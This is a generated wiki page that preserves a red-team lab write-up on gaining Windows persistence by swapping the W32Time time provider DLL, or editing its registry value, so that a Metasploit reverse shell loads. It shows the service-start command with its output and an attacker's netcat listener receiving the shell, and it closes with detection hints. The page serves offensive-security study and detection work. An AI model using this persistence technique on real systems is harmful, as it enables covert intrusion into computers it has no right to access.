---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Hijacking Time Providers

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-persistence-t1209-hijacking-time-providers` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/persistence/t1209-hijacking-time-providers.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Service w32time depends on the DLL specified in HKEYLOCALMACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\.

## Preserved Body

````markdown
## Execution

Service w32time depends on the DLL specified in `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\`. 

If an attacker can replace the `w32time.dll` with his malicious DLL or modify the DllName value to point to his malicious binary, he can get that malicious code executed. 

In this lab, we will just swap out the `w32time.dll` with our own. It contains a metasploit reverse shell payload:

![](<../../_assets/time-registry.png>)

Starting the w32time service:

```csharp
C:\Users\mantvydas\Start Menu\Programs\Startup>sc.exe start w32time

SERVICE_NAME: w32time
        TYPE               : 20  WIN32_SHARE_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 964
        FLAGS              :
```

Attacker receiving a reverse shell:
```csharp
root@~# nc -lvvp 443
listening on [any] 443 ...
10.0.0.2: inverse host lookup failed: Unknown host
connect to [10.0.0.5] from (UNKNOWN) [10.0.0.2] 64634
```
## Observations

The shell is running as a child of svchost which is expected as this is where all the services originate from:

![](<../../_assets/time-ancestry.png>)

Note that the code is running under the context of `LOCAL SERVICE`:

![](<../../_assets/time-context.png>)

This time and time again shows that binaries running off of svchost.exe, especially if they are rundll32 and are making network connections, should be investigated further.

## References
````

## Source Verification

[source record](../../sources/redteamingtactics/hijacking-time-providers.md)

## Evidence Excerpt

```text
_asset_filenames:
- time-ancestry.png
- time-context.png
- time-registry.png
_body: "---\ndescription: Persistence\n---\n\n# Hijacking Time Providers\n\n## Execution\n\nService w32time depends on the\
\ DLL specified in `HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\`. \n\nIf an attacker\
\ can replace the `w32time.dll` with his malicious DLL or modify the DllName value to point to his malicious binary, he\
\ can get that malicious code executed. \n\nIn this lab, we will just swap out the `w32time.dll` with our own. It contains\
```
